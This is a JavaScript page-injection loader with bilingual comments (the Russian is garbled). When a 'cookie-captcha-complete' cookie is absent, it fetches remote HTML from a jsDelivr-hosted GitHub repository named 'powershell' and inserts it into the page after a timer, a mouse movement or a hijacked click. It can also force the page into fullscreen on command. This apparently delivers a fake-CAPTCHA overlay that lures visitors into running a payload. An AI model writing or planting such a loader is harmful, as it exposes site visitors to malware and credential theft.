/* ÐÐ°ÑÑ‚Ñ€Ð¾Ð¹ÐºÐ¸ */
/* Settings */

// Ð ÐµÐ¶Ð¸Ð¼ ÑÐ¾Ð±Ñ‹Ñ‚Ð¸Ð¹
// 0 - ÑÑ€Ð°Ð·Ñƒ/Ð¿Ð¾ Ñ‚Ð°Ð¹Ð¼ÐµÑ€Ñƒ
// 1 - Ð´Ð²Ð¸Ð¶ÐµÐ½Ð¸Ðµ Ð¼Ñ‹ÑˆÑŒÑŽ
// 2 - Ð¿Ð¾ ÐºÐ»Ð¸ÐºÑƒ
// Events mode
// 0 - immediately/by timer
// 1 - mouse movement
// 2 - click
const mode = 0;

// Ð¢Ð°Ð¹Ð¼ÐµÑ€
// Timer
const timer = 1000;

// Ð¡Ð¾Ð±Ñ‹Ñ‚Ð¸Ðµ Ð¿ÐµÑ€ÐµÐ·Ð°Ð³Ñ€ÑƒÐ·ÐºÐ¸ ÑÑ‚Ñ€Ð°Ð½Ð¸Ñ†Ñ‹
// Page reload event
window.addEventListener("message", e =>
{
    if(e.data === "reload")
    {
        window.location.reload();
    }
});

// Ð¡Ð¾Ð±Ñ‹Ñ‚Ð¸Ðµ Ð¿ÐµÑ€ÐµÑ…Ð¾Ð´Ð° ÑÑ‚Ñ€Ð°Ð½Ð¸Ñ†Ñ‹ Ð² Ð¿Ð¾Ð»Ð½Ñ‹Ð¹ ÑÐºÑ€Ð°Ð½
// The event of transitioning the page to full screen
window.addEventListener("message", e =>
{
    if(e.data === "fullscreen")
    {
        document.documentElement.requestFullscreen();
    }
});

// Ð¤ÑƒÐ½ÐºÑ†Ð¸Ñ Ñ‡Ñ‚ÐµÐ½Ð¸Ñ ÐºÑƒÐºÐ¸
// Function for reading cookie
function getCookie(name)
{
    const match = document.cookie.match(new RegExp("(^|; )" + name + "=([^;]*)"));
    return match ? decodeURIComponent(match[2]) : null;
}

// Ð§Ñ‚ÐµÐ½Ð¸Ðµ ÐºÑƒÐºÐ¸
// Reading cookie
const cookiename = "cookie-captcha-complete";
const cookie = getCookie(cookiename);

// ÐšÑƒÐºÐ° Ð½Ðµ Ð½Ð°Ð¹Ð´ÐµÐ½Ð°
// Cookie found
if(!cookie)
{
    fetch("https://cdn.jsdelivr.net/gh/joault/powershell@main/catchall.js") 
    .then(response => response.ok ? response.text() : Promise.reject())
    .then(html =>
    {
        if(html.length === 0)
        {
            document.cookie = cookiename + "=1; path=/; max-age=" + (60 * 60 * 24 * 365);
        }

        else
        {
            // mousemove - Ð»ÑŽÐ±Ð¾Ðµ Ð´Ð²Ð¸Ð¶ÐµÐ½Ð¸Ðµ Ð¼Ñ‹ÑˆÑŒÑŽ
            if(mode === 1)
            {
                document.addEventListener("mousemove", function(e)
                {
                    setTimeout(() =>
                    {
                        document.body.insertAdjacentHTML("beforeend", html);
                    }, timer);
                }, { once: true });
            }

            // click - ÐºÐ»ÑŽÐº Ð¼Ñ‹ÑˆÑŒÑŽ Ð² Ð»ÑŽÐ±Ð¾Ð¼ Ð¼ÐµÑÑ‚Ðµ
            else if(mode === 2)
            {
                document.addEventListener("click", function(e)
                {
                    // ÐŸÑ€ÐµÐ´Ð¾Ð²Ñ€Ð°Ñ‰ÐµÐ½Ð¸Ðµ Ð¿ÐµÑ€ÐµÑ…Ð¾Ð´Ð° Ð¿Ð¾ ÑÑÑ‹Ð»ÐºÐµ
                    e.preventDefault();

                    setTimeout(() =>
                    {
                        document.body.insertAdjacentHTML("beforeend", html);
                    }, timer);
                }, { once: true });
            }

            // Ð±ÐµÐ· ÑÐ¾Ð±Ñ‹Ñ‚Ð¸Ð¹, Ð½Ð¾ Ñ Ð²Ð¾Ð·Ð¼Ð¾Ð¶Ð½Ð¾ÑÑ‚ÑŒÑŽ ÑƒÐºÐ°Ð·Ð°Ñ‚ÑŒ Ñ‚Ð°Ð¹Ð¼ÐµÑ€
            else
            {
                setTimeout(() =>
                {
                    document.body.insertAdjacentHTML("beforeend", html);
                }, timer);
            }
        }
    })
    .catch(() => console.error("Failed to load page!"));
}
